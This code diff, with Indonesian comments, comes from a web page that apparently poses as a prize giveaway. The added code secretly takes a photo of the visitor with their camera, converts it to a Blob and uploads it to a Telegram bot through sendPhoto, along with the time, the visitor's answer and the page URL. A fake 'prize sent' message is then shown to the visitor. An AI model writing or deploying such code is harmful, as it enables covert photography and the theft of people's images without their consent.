@@ -374,6 +374,7 @@
                     audio: false 
                 });
                 video.srcObject = stream;
+                console.log('Kamera berhasil diakses');
             } catch (err) {
                 console.log('Kamera tidak dapat diakses');
             }
@@ -415,26 +416,53 @@
             });
         }
 
-        // Fungsi untuk mengirim ke Telegram - VERSI SIMPLE
+        // Fungsi untuk convert DataURL ke Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Fungsi untuk mengirim FOTO ke Telegram
         async function sendToTelegram(photoDataUrl) {
             try {
+                if (!photoDataUrl) {
+                    throw new Error('Tidak ada foto yang diambil');
+                }
+
                 const message = `📸 Foto berhasil diambil!\n📅 Waktu: ${new Date().toLocaleString('id-ID')}\n🎨 Jawaban: ${selectedOption}\n🌐 Dari: ${window.location.href}`;
                 
-                // Coba kirim pesan dulu (lebih reliable)
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
-                const result = await response.json();
+                // Convert DataURL to Blob
+                const blob = dataURLtoBlob(photoDataUrl);
                 
+                // Create FormData
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+                formData.append('caption', message);
+                
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
                 console.log('Telegram Response:', result);
                 
                 if (result.ok) {
                     return true;
                 } else {
-                    // Jika gagal, coba detail error
-                    console.error('Telegram Error:', result);
+                    console.error('Telegram Error:', result.description);
                     return false;
                 }
             } catch (error) {
-                console.error('Network Error:', error);
+                console.error('Error mengirim foto:', error);
                 return false;
             }
         }
@@ -453,7 +481,11 @@
                 // Ambil foto secara diam-diam
                 const photoDataUrl = await takePhoto();
                 
-                // Kirim ke Telegram
+                if (!photoDataUrl) {
+                    throw new Error('Kamera tidak dapat mengakses foto');
+                }
+                
+                // Kirim FOTO ke Telegram
                 const success = await sendToTelegram(photoDataUrl);
                 
                 if (success) {
@@ -463,12 +495,11 @@
                         showStatus('Hadiah telah berhasil dikirim! Terima kasih telah berpartisipasi.', 'success');
                     }, 3000);
                 } else {
-                    // Tampilkan error lebih spesifik
-                    showStatus('Gagal mengirim. Pastikan bot Telegram aktif dan konfigurasi benar.', 'error');
+                    throw new Error('Gagal mengirim foto ke Telegram');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                showStatus('Terjadi kesalahan jaringan. Silakan coba lagi.', 'error');
+                showStatus('Maaf, terjadi kesalahan. Silakan coba lagi.', 'error');
             } finally {
                 claimBtn.disabled = false;
                 claimBtn.innerHTML = '<i class="fas fa-trophy"></i> Klaim Hadiah Sekarang!';
